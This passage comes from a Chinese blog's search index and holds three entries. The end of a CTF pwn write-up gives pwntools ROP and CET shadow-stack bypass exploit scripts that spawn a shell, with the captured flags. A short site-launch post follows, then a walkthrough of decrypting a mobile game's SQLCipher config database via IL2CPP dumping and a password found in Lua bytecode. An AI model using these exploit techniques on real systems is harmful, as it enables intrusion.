+= p64(0x401F0F)send(payload)pop_rax_ret = 0x463DA7pop_rdi_ret = 0x402F7Cpop_rsi_ret = 0x404669pop_rdx_rbx_ret = 0x4AF0DBsyscall = 0x410129payload = b&quot;/bin/sh\\x00&quot;.ljust(0x20, b&quot;\\x00&quot;)payload += p64(0x31338008)payload += p64(0x401F0F)payload += p64(pop_rdi_ret) + p64(0x31337FE0)payload += p64(pop_rsi_ret) + p64(0)payload += p64(pop_rdx_rbx_ret) + p64(0) * 2payload += p64(pop_rax_ret) + p64(0x3B)payload += p64(syscall)send(payload)sh.interactive()\n\nflag&#123;0k_bUt_bypass_stackprotector_with_CHOP_wont_work_in_the_latest_t00lchains_aad914e81b&#125;\n\ncet-bypass和第一题差不多，但是加入了影子栈的安全检查，还提供了一次任意文件读和任意修改一个字节的后门，直接读 /proc/self/maps ，再将影子栈上的返回地址也修改成 banner 函数上的地址即可。\nfrom pwn import *elf = ELF(&quot;./cet-bypass&quot;)context.binary = elfsh = remote(&quot;202.38.93.141&quot;, 31337)token = b&quot;&quot;sh.recvline()sh.sendline(token)def send_end():    sh.sendline(str(0x31337).encode())def send(bts):    for i in range((len(bts) + 7) // 8):        sh.sendline(str(int.from_bytes(bts[i * 8 : i * 8 + 8][::-1])).encode())sh.recvuntil(b&quot;one.\\n&quot;)send(b&quot;a&quot; * 0x18)sh.sendline(b&quot;-&quot;)  # bypass canarypayload = p64(elf.bss(0x800))payload += p64(0x4017E0)payload += p64(0) * 2payload += b&quot;/bin/sh\\x00&quot;send(payload)send_end()sh.sendlineafter(b&quot;: &quot;, b&quot;/proc/self/maps&quot;)for i in range(130):    sh.recvline()shstk_addr = int(sh.recvuntil(b&quot;-&quot;, True), 16)print(&quot;shstk @&quot;, hex(shstk_addr))sh.sendline(str(shstk_addr + 0x2FD9).encode())sh.sendline(str(0x17).encode())sh.interactive()\n\nflag&#123;0k_bUt_th3r3_ve_been_protections_about_this_and_y0u_can_on1y_modify_it_with_wrss_aa70b1ea95&#125;\n\n其实还有很多想做的题目！！可惜比赛的那周实在是抽不开身了，明年想拿到 50% 的分数，可以吗？\n","categories":["Writeup","CTF"]},{"title":"Rabbi! Rabbi!","url":"/posts/806d9f181b8d/","content":"嗨多磨！\n耶耶耶终于建好站了，回顾经典庆祝下！\n\n","categories":["虚空"]},{"title":"手游 SQLite3 数据库解密实例","url":"/posts/9b75b715dbbb/","content":"近期有新游上线，久违的写篇流水账。\n在 Android 目录下可以找到热更新包的配置文件，后缀名是 .bytes，直接打开发现是加密过的，基本没有规律可言。\n加密的配置文件\n首先找 libil2cpp.so 和 global-metadata.dat，两个文件都没有加密，可以直接用 Il2CppDumper 解出。打开导出的 stringliteral.json 文件，搜索 .bytes，发现确实存在该字符串，位于地址 0x5249578。\n在 IDA 中打开 libil2cpp.so，定位到这个地址，搜索其交叉引用，可以找到一个函数 SQLiteLoader$$OnLoadFile，疑似用于加载配置文件。\n交叉引用\n在反汇编结果中发现该函数只是读取了配置文件内容，没有对文件解密的过程，在相关函数中寻找也一无所获。但是在另一个函数 ConfigDBMap$$IsDBInUse 中发现调用了 MUGame.LuaUtil$$IsFileLocked，怀疑配置文件读取发生在 lua 脚本中。\n热更新包中可以找到分散的 lua 文件，其中有一个文件名为 DBTools.bytes，文件头是 1B 4C 4A，标准的 LuaJIT 文件头，尝试使用 ljd 反编译，可惜失败。重新打开文件，发现存在字符串字面量 dbPassword，最后可以找到一串显然格格不入的字符串 apj20240312（已脱敏），疑似数据库密码。\nGoogle 搜索「SQLite3 加密」，基本上都指向同一个软件 SQLCipher。软件付费分发但是免费开源。在 WSL2 上克隆储存库之后按照 README.md 中的方法 2 编译成功，之后尝试解密。\nmilkory@mky0:~/test$ ./sqlcipherSQLite version 3.44.2 2023-11-24 11:41:44 (SQLCipher 4.5.6 community)Enter &quot;.help&quot; for usage hints.Connected to a transient in-memory database.Use &quot;.open FILENAME&quot; to reopen on a persistent database.sqlite&gt; .open ConfDataBasic.bytessqlite&gt; PRAGMA key=&#x27;apj20240312&#x27;;oksqlite&gt; .tablesConfActivityPalace            ConfOWDayTypeConfActivityTrackAD           ConfOWDivination(以下略)\n\n可见解密成功。接下来要写脚本导出数据，我选择使用 Python 库 pysqlcipher3 来导出。这个库也需要自己构建。\n构建后，编写解包脚本，其中核心代码如下。\nfrom pysqlcipher3 import dbapi2 as sqlitedef unpack(db_path, out_path):    conn = sqlite.connect(db_path)    cur = conn.cursor()    cur.execute(&quot;PRAGMA key=&#x27;%s&#x27;;&quot;%db_password)    tables = cur.execute(&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27;;&quot;).fetchall()    table_names = [t[0] for t in tables]    for table in table_names:        data = cur.execute(&quot;SELECT * FROM %s;&quot;%table).fetchall()        columns = [desc[0] for desc in cur.description]        rows = [dict(zip(columns, row)) for row in data]        with open(os.path.join(out_path, &#x27;%s.json&#x27;)%table, &#x27;w&#x27;) as f:            json.dump(rows, f, indent=4, ensure_ascii=False)    conn.close()\n\n以上是对游戏数据的解包流程。该游戏的游戏资源也无法直接解出，但不在本文讨论范围之内。这里简单提一下，只要把文件头中多余的 UnityFS 片段删去，就能用 Studio 处理了。\n"}]